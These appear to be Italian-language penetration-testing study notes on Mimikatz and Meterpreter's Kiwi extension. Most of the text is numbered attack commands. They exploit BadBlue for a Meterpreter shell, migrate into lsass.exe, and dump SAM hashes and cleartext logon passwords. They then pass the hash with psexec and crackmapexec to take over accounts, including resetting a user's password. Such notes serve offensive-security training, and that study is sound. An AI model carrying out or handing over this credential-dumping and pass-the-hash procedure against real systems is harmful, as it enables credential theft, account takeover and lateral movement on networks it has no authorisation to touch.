**Mimikatz** è uno strumento di **post-exploitation per Windows** scritto da Benjamin Delpy (@gentilkiwi).
Consente di **estrarre dalla** **memoria password** in **chiaro**, **hash e ticket Kerberos**

- Il **database** **SAM** (Security Account Manager) è un file di database sui sistemi Windows che
memorizza le password degli utenti con hash.
- **Mimikatz** può essere **utilizzato** per **estrarre** gli **hash** dalla memoria del processo **lsass.exe**, **dove gli hash sono memorizzati.**
- Si può utilizzare **l'eseguibile** precompilato **mimikatz** OPPURE se si ha accesso a una **sessione meterpreter** su un target Windows, si può **utilizzare** l'estensione **meterpreter Kiwi**.

Nota: per funzionare correttamente, Mimikatz richiede privilegi elevati.

EXPLOIT

1. **service postgresql start && msfconsole -q** 
2. search badblue
3. **use exploit/windows/http/badblue_passthru** crea shell meterpreter sul target
    1. set rhosts
    2. run
4. **migrate -N lsass.exe** migra nel processo lsass.exe
5. **getuid** verifichiamo se siamo authority\system
6. **load kiwi**
7. **?** apre il manuale dei comandi
8. **lsa_dump_sam** stampare a schermo gli use e gli hash delle pass, dumb del database SAM
9. copiamo hash administrator
10. **hashdump** ci darà LM hash (uguale per tutti gli utentu) e la NTLM hash (univoca)
    1. copiare gli hash insieme **Esempio= LM0000000:NTLM00000**
11. **crtl+z** mettiamo la sessione meterpreter in background 
12. **search psexec**
13. **use exploit/windows/smb/psexec** inserendo hash otterremo shell meterpreter
    1. **set LPORT** cambiare se la sessione corrente utilizza la stessa porta del payload (possiamo verificarlo con comando **sessions**)
    2. **set RHOSTS**
    3. **set SMBUser NOME_UTENTE**
    4. **set SMBPass LM0000000:NTLM00000**
    5. **set target Native\ upload**
    6. **run** per ottenere shell meterpreter

CRACKMAPEXEC TOOL

1. **crackmapexec smb IP_TARGET -u NOME_UTENTE -H** “**NTLM00000”**
    1. **-u** nome utente
    2. **-H** hash
2. **-x “whoami”** si mette sempre -x prima di inviare un comando e tra virgolette
3. **-x “net user NOME_UTENTE password 123456789”** cambia la password del nome utente in 123456789
4. **-x “net user”** enumera gli utenti

CON MIMIKATS

1. **service postgresql start && msfconsole -q** 
2. search badblue
3. **use exploit/windows/http/badblue_passthru** crea shell meterpreter sul target
    1. set rhosts
    2. run
4. **migrate -N lsass.exe** migra nel processo lsass.exe
5. **getuid** verifichiamo se siamo authority\system
6. **load kiwi**
7. **cd C:\\**
8. **mkdir Temp**
9. **cd Temp**
10. **upload /usr/share/windwows-resources/mimikatz/x64/mimikatz.exe** carichiamo mimikats sul targhet (su kali mimikats è presente di default)
11. **shell**
12. **dir**
13. **.\ mimikatz.exe** avviamo mimikatz
14. **privilege::debug** se output è Privilege 20 ok allora possiamo proseguire
15. **lsadumb::sam** prende dalla chace del processo lsall gli hash delle pass
16. **lsadump::secrets** comando che dara’ un output simile a quello di kiwi
17. **sekurlsa::logonpasswords** se il target è configurato male questo comando può mostrarci le password in chiaro
18. **copiamo hash administrator**
19. **hashdump** ci darà LM hash (uguale per tutti gli utentu) e la NTLM hash (univoca)
    1. copiare gli hash insieme **Esempio= LM0000000:NTLM00000**
20. **crtl+z** mettiamo la sessione meterpreter in background 
21. **search psexec**
22. **use exploit/windows/smb/psexec** inserendo hash otterremo shell meterpreter
    1. **set LPORT** cambiare se la sessione corrente utilizza la stessa porta del payload (possiamo verificarlo con comando **sessions**)
    2. **set RHOSTS**
    3. **set SMBUser NOME_UTENTE**
    4. **set SMBPass LM0000000:NTLM00000**
    5. **set target Native\ upload**
    6. **run** per ottenere shell meterpreter

CRACKMAPEXEC TOOL

1. **crackmapexec smb IP_TARGET -u NOME_UTENTE -H** “**NTLM00000”**
    1. **-u** nome utente
    2. **-H** hash
2. **-x “whoami”** si mette sempre -x prima di inviare un comando e tra virgolette
3. **-x “net user NOME_UTENTE password 123456789”** cambia la password del nome utente in 123456789
4. **-x “net user”** enumera gli utenti
